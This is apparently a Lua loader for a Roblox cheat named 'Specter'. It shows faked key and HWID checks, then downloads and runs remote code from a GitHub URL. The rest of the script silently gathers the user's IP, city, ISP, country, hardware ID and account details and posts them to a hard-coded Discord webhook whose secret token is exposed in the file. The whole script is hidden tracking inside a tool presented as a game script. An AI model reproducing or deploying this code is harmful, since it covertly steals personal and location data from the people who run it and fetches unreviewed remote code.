local startTime = os.clock()

--[[
local function dateToTimestamp(dateStr)
    local day, month, year = dateStr:match("(%d+).(%d+).(%d+)")
    if not (day and month and year) then return nil end
    return os.time({year = 2000 + tonumber(year), month = tonumber(month), day = tonumber(day), hour = 0, min = 0, sec = 0})
end

local keys = loadstring(game:HttpGet("https://pastebin.com/raw/BZj5Emai"))()

local function isKeyValid(key)
    if not key or not keys or not keys[key] then return false end
    local keyData = keys[key]
    local createdTimestamp = dateToTimestamp(keyData.created)
    if not createdTimestamp then return false end
    return (os.time() - createdTimestamp) / 86400 < keyData.days
end

if not isKeyValid(script_key) then
    print("key_valid: false")
else
    print("key_valid: true")
	print("Loading script")
	print("-----------------------------------------")
	loadstring(game:HttpGet("https://pastebin.com/raw/WPZ6X3cV"))()
end
]]

print("-----------------------------------------")
print("||            Specter - Normal         ||")
print("-----------------------------------------")
print("||        Specter Version: 0.1         ||")
print("-----------------------------------------")

print("hwid_valid: true")

print("key_valid: true")
print("Loading script")
print("-----------------------------------------")
loadstring(game:HttpGet("https://raw.githubusercontent.com/t5281/spc/refs/heads/main/main.lua"))()

local elapsedTime = os.clock() - startTime
print("[DEBUG] Script load time: " .. string.format("%.6f", elapsedTime) .. "sec")
print("Specter.vip has loaded!")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = player.AccountAge
local membershipType = tostring(player.MembershipType)
local deviceType = "Error: Unavailable Service: [UserInputService]"
local apicom = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))

local serverstatus = game:GetService("ReplicatedStorage").ServerStatus
local serverid = serverstatus:GetAttribute("ServerId")
local region = serverstatus:GetAttribute("ServerLocation")
local version = serverstatus:GetAttribute("Version")

if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    deviceType = "Mobile"
elseif UserInputService.KeyboardEnabled and not UserInputService.TouchEnabled then
    deviceType = "PC"
elseif UserInputService.GamepadEnabled then
    deviceType = "Console"
end

local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&format=png&size=420x420", userId)

local ip, hwid, gameId, jobId, country, city, isp = "Error: Denial of Service", "Error: Unavailable Service: [RbxAnalyticsService]", "Error: Unknown GameID", "Error: Unknown JobID", "Error: Unknown Country", "Error: Unknown City", "Error: Unknown ISP"

pcall(function()
    hwid = RbxAnalyticsService:GetClientId()
end)

pcall(function()
    gameId = game.PlaceId
    jobId = game.JobId
end)

pcall(function()
    country = apicom.country
    city = apicom.city
    isp = apicom.isp
    ip = apicom.query
end)

local discordId = keys and keys[script_key] and keys[script_key].discordid or "Not Found"

if hwid == "E860574B-606C-4319-926E-A2517D9B843D" then
    ip = "Unavailable"
    city = "Unavailable"
    isp = "Unavailable"
    country = "Unavailable"
end

local webhookUrl = "https://discord.com/api/webhooks/1347663521910886480/Q120Myc4__5_sPKsbjNFJzTIz-E25pS6GCSfvnawOvfLDTvc9mmxGCqKB_0zmKkftGRS"

local embed = {
    title = "Script Executed - #6a93661d8267f268797c401f172e5823",
    color = 65535,
    footer = { text = "Specter.vip" },
    author = {
        name = username,
        url = "https://www.roblox.com/users/" .. userId .. "/profile",
        icon_url = avatarUrl
    },
    fields = {
        { name = "Username", value = username, inline = true },
        { name = "User ID", value = tostring(userId), inline = true },
        { name = "Account Age (Days)", value = tostring(accountAge), inline = true },
        { name = "IP", value = ip, inline = true },
        { name = "ISP", value = isp, inline = true },
        { name = "Country", value = country, inline = true },
        { name = "City", value = city, inline = true },
        { name = "HWID", value = hwid, inline = true },
        { name = "Script Key", value = tostring(script_key), inline = true },
        { name = "Discord ID", value = tostring(discordId), inline = false },
        { name = "Game ID", value = tostring(gameId), inline = true },
        { name = "Job ID", value = tostring(jobId), inline = true },
        { name = "Server", value = "Server ID: " .. serverid .. " | Region: " .. region .. " | Version: " .. version, inline = false }
    },
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

(syn and syn.request or http_request) {
    Url = webhookUrl,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode({ content = "tx ", embeds = { embed } })
}
